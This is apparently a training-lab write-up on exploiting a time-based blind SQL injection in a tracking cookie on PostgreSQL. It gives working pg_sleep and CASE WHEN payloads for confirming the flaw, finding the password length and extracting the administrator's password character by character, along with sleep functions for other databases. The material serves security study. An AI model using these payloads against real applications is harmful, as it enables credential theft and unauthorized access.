# Lab 15: Blind SQL Injection with Time Delays and Information Retrieval

### Instructions

This lab contains a blind SQL injection vulnerability. The application uses a
tracking cookie for analytics, and performs a SQL query containing the value of
the submitted cookie.

The results of the SQL query are not returned, and the application does not
respond any differently based on whether the query returns any rows or causes
an error. However, since the query is executed synchronously, it is possible to
trigger conditional time delays to infer information.

The database contains a different table called users, with columns called
username and password. You need to exploit the blind SQL injection vulnerability
to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

### Solution

#### Concepts Covered

- Blind SQL injection with no visible response difference whatsoever
- Time-based oracle — inferring data from conditional response delays
- pg_sleep() as the delay mechanism (PostgreSQL)
- CASE WHEN as the conditional trigger
- Character-by-character password extraction via ASCII + SUBSTRING
- Dynamic password length detection using the same time-based oracle
- Cookie-based injection point

---

#### Vulnerability

The `TrackingId` cookie value is inserted unsanitised into a synchronous SQL
query. Unlike boolean and error-based blind SQLi, there is no visible
difference in the response — no text change, no status code change. The only
signal available is response time.

Because the query executes synchronously, forcing the database to sleep for a
measurable duration when a condition is true creates a timing oracle. A
condition that is true causes a delay. A condition that is false returns
immediately.

Likely backend query:

```sql
SELECT * FROM tracking WHERE id = '<TRACKING_ID>'
```
Injecting via string concatenation with a conditional sleep:

```sql
SELECT * FROM tracking WHERE id = 'TRACKINGID' || (SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

True condition  -> `pg_sleep(10)` executes -> response delayed ~10 seconds
False condition -> `pg_sleep(0)` executes  -> response returns immediately

---

#### Exploitation Approach

##### Step 1 — Confirm injection point and database type

Append a simple unconditional sleep to the `TrackingId` cookie:

```sql
' || pg_sleep(10)--
```
If the response takes ~10 seconds, the injection point is confirmed and the
database is PostgreSQL.

##### Step 2 — Confirm boolean control over the delay

Test a true condition:

```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```
-> delays ~10 seconds (true)

Test a false condition:

```sql
' || (SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```
-> returns immediately (false)

This confirms conditional time control.

##### Step 3 — Confirm administrator user exists

```sql
' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```
Delay confirms the administrator row exists in the users table.

##### Step 4 — Detect password length

Iterate `CASE WHEN LENGTH(password)=N for N=1..50` until delay fires.
Password length: 20

##### Step 5 — Extract password

For each position 1-20, iterate ASCII values 32-126 testing:

```sql
CASE WHEN ASCII(SUBSTRING(password,N,1))=J THEN pg_sleep(10) ELSE pg_sleep(0) END
```
Record the character when the delay fires. Repeat for all 20 positions.

---

#### Key Payloads

Length detection:

```sql
' || (SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

Character extraction:

```sql
' || (SELECT CASE WHEN ASCII(SUBSTRING(password,1,1))=97 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

---

#### Time-Based vs Previous Blind Variants

| Variant        | Oracle Signal              | True Condition Triggers | Reliability | Speed     |
|----------------|----------------------------|-------------------------|-------------|-----------|
| Lab 11 Boolean | "Welcome back" in page     | Text appears            | High        | Fast      |
| Lab 12 Error   | HTTP 500 status code       | Division by zero        | High        | Fast      |
| Lab 15 Time    | Response delay >= N secs   | pg_sleep(N)             | Lower       | Very slow |

---

#### Database — PostgreSQL Specific Notes

This lab runs on PostgreSQL. Key syntax:

- Sleep function: pg_sleep(seconds) — accepts decimals e.g. pg_sleep(0.5)
- String concatenation: || same as Oracle
- Substring: SUBSTRING(str, pos, len) — same as MySQL
- The sleep is triggered inside a subquery so it must return a value —
  wrapping in SELECT handles this

Other database equivalents for reference:
- MySQL:      SLEEP(5)
- MSSQL:      WAITFOR DELAY '0:0:5'
- Oracle:     dbms_pipe.receive_message(('a'),5)

---

#### Automation

Solved via Python script — see sqli_15.py

Manual exploitation is completely impractical for time-based SQLi. Each
character guess requires waiting for a full delay period to confirm a negative
result. Worst case for a 20-character password at 10 seconds per request:

20 positions x 95 chars x 10 seconds = ~316 minutes worst case

Even average case (~47 guesses per position) is ~157 minutes unoptimized.
The script brings this down significantly but time-based will always be the
slowest blind variant. Future optimization via binary search could reduce
per-position attempts from 95 to ~7.

`python3 sqli_15.py <LAB_URL>`

---

#### Takeaways

- Time-based SQLi is the last resort oracle — use it only when there is
  genuinely no visible response difference whatsoever
- The timing oracle is less reliable than boolean or error-based due to
  network jitter — a higher delay threshold reduces false positives at the
  cost of speed
- pg_sleep() inside a CASE WHEN gives you the same boolean primitive as
  the other variants, just expressed through time instead of content or errors
- Database fingerprinting matters — pg_sleep() is PostgreSQL only, each DB
  has its own sleep function
- The CASE WHEN pattern is now consistent across all three blind variants —
  only the true-condition action changes (text, error, or sleep)
- Binary search is the most impactful optimization available for any
  character-by-character extraction script — reduces worst case from 95
  requests per position to 7
